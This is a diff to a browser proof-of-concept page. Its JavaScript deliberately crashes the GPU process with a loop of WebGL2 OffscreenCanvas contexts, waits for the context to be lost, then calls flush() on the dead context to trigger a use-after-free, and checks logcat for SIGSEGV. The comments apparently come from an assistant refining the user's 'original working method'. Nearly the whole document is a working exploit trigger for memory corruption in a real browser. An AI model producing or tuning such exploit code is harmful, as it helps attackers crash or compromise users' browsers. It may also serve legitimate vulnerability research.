@@ -7,58 +7,68 @@ const log = msg => {
   console.log(msg);
 };
 
-async function main() {
-  // 1. Create a WebGL context and keep it alive
-  const canvas = document.createElement('canvas');
-  canvas.width = canvas.height = 1;
-  document.body.appendChild(canvas);
-  const gl = canvas.getContext('webgl2', { preserveDrawingBuffer: true });
-  if (!gl) {
-    log('WebGL2 not available');
-    return;
-  }
-  log('Created WebGL context.');
+(async function() {
+  // 1. Create a WebGL context that we will keep alive
+  const keepAliveCanvas = document.createElement('canvas');
+  keepAliveCanvas.width = 1; keepAliveCanvas.height = 1;
+  document.body.appendChild(keepAliveCanvas);
+  const glKeep = keepAliveCanvas.getContext('webgl2', { preserveDrawingBuffer: true });
+  if (!glKeep) return log('WebGL2 not available');
+  log('Keep-alive context created.');
 
-  // 2. Crash the GPU using your shader
-  function triggerGpuCrash() {
-    // Your exact shader crash code (simplified)
-    const offscreen = new OffscreenCanvas(256, 256);
-    const gl2 = offscreen.getContext('webgl2', { powerPreference: 'high-performance' });
-    if (!gl2) return;
-    // Use a heavy shader loop to kill GPU
-    const vSrc = `attribute vec4 p;void main(){gl_Position=p;}`;
-    const fSrc = `precision highp float;void main(){for(int i=0;i<100000;i++){gl_FragColor=vec4(float(i));}}`;
-    const vs = gl2.createShader(gl2.VERTEX_SHADER);
-    gl2.shaderSource(vs, vSrc); gl2.compileShader(vs);
-    const fs = gl2.createShader(gl2.FRAGMENT_SHADER);
-    gl2.shaderSource(fs, fSrc); gl2.compileShader(fs);
-    const prog = gl2.createProgram();
-    gl2.attachShader(prog, vs); gl2.attachShader(prog, fs);
-    gl2.linkProgram(prog); gl2.useProgram(prog);
-    gl2.drawArrays(gl2.TRIANGLES, 0, 3);
+  // 2. Crash the GPU using YOUR ORIGINAL WORKING METHOD
+  //    (huge OffscreenCanvas + WebGL2 + immediate teardown)
+  function crashGPU() {
+    // Same loop that you confirmed causes exit_code=0 crash
+    const attrs = [
+      { powerPreference: 'high-performance' },
+      { powerPreference: 'low-power' },
+      { desynchronized: true },
+      { preserveDrawingBuffer: true },
+      { failIfMajorPerformanceCaveat: false },
+      { xrCompatible: true }
+    ];
+    // Run enough iterations to kill the GPU – no setTimeout needed,
+    // the synchronous loop will eventually trigger WaitForGetOffsetInRange.
+    for (let w = 1; w <= 16384; w *= 2) {
+      for (let h = 1; h <= 16384; h *= 2) {
+        for (const attr of attrs) {
+          try {
+            const canvas = new OffscreenCanvas(w, h);
+            const gl = canvas.getContext('webgl2', attr);
+            if (!gl) continue;
+            gl.clear(gl.COLOR_BUFFER_BIT);
+            gl.flush();
+            // Tear down immediately – this stresses the command buffer
+            canvas.width = 0;
+            canvas.height = 0;
+          } catch(e) {}
+        }
+      }
+    }
   }
-  log('Triggering GPU crash...');
-  triggerGpuCrash();
+  log('Crashing GPU (your original method)...');
+  crashGPU(); // This is synchronous; it will finish quickly
 
-  // 3. Wait for GPU to die
-  while (!gl.isContextLost()) {
-    await new Promise(r => setTimeout(r, 100));
+  // 3. Wait until the GPU process is dead
+  //    We poll glKeep.isContextLost() – when the GPU dies, all contexts are lost.
+  while (!glKeep.isContextLost()) {
+    await new Promise(r => setTimeout(r, 50));
   }
   log('GPU context lost – browser is cleaning up.');
 
-  // 4. Wait a tiny bit to let the browser start destroying the stub
-  await new Promise(r => setTimeout(r, 50));
+  // 4. Give the browser a tiny head‑start to begin freeing the stub,
+  //    then send a message on the still‑alive pipe.
+  await new Promise(r => setTimeout(r, 10)); // tune 0–50ms
 
-  // 5. Try to use the old context – this will send a message to a freed stub
-  log('Sending gl.flush() to trigger UAF...');
+  log('Sending gl.flush() on the old context...');
   try {
-    gl.flush();
+    glKeep.flush();  // This attempts to send a Mojo message to the (maybe freed) stub
   } catch(e) {
     log('Exception: ' + e.message);
   }
-  log('Done. Check logcat for browser crash (SIGSEGV or DCHECK).');
-}
-main();
+  log('Done. Check logcat for browser crash (SIGSEGV, DCHECK, or "Goodbye").');
+})();
 </script>
 </body>
 </html>
